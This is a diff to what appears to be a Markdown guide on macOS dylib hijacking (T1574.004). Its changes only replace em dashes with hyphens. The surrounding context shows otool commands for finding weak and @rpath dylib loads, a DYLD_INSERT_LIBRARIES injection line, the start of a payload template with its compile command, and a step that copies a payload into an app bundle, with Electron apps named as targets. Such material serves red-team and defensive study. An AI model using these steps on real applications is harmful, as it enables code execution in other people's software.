@@ -2,7 +2,7 @@
 
 Exploit weak dynamic library loading to execute code in the context of a target application.
 
-**MITRE ATT&CK**: T1574.004 — Dylib Hijacking
+**MITRE ATT&CK**: T1574.004 - Dylib Hijacking
 
 ---
 
@@ -16,7 +16,7 @@ macOS applications load dynamic libraries (`.dylib`) using paths that may includ
 | `@loader_path` | Directory containing the Mach-O that references the dylib |
 | `@rpath` | Run-path search paths set in the binary (can be multiple) |
 
-If a dylib isn't found at its expected path, the loader searches fallback locations — an attacker can place a malicious dylib there first.
+If a dylib isn't found at its expected path, the loader searches fallback locations - an attacker can place a malicious dylib there first.
 
 ---
 
@@ -30,7 +30,7 @@ otool -L /Applications/TargetApp.app/Contents/MacOS/TargetApp
 # Show @rpath search paths
 otool -l /Applications/TargetApp.app/Contents/MacOS/TargetApp | grep -A2 LC_RPATH
 
-# Find weak dylib loads (optional libraries — won't crash if missing)
+# Find weak dylib loads (optional libraries - won't crash if missing)
 otool -l /Applications/TargetApp.app/Contents/MacOS/TargetApp | grep -A4 LC_LOAD_WEAK_DYLIB
 ```
 
@@ -93,7 +93,7 @@ DYLD_INSERT_LIBRARIES=/path/to/payload.dylib /Applications/TargetApp.app/Content
 
 ### Payload Template
 ```c
-// payload.c — compile with: gcc -dynamiclib -o payload.dylib payload.c
+// payload.c - compile with: gcc -dynamiclib -o payload.dylib payload.c
 #include <stdio.h>
 #include <stdlib.h>
 
@@ -132,7 +132,7 @@ cp payload.dylib ~/Applications/TargetApp.app/Contents/Frameworks/SomeLib.framew
 
 ## 4. Electron App dylib Hijacking
 
-Electron apps are prime targets — they bundle frameworks with predictable paths.
+Electron apps are prime targets - they bundle frameworks with predictable paths.
 
 ```bash
 # Electron apps typically load:
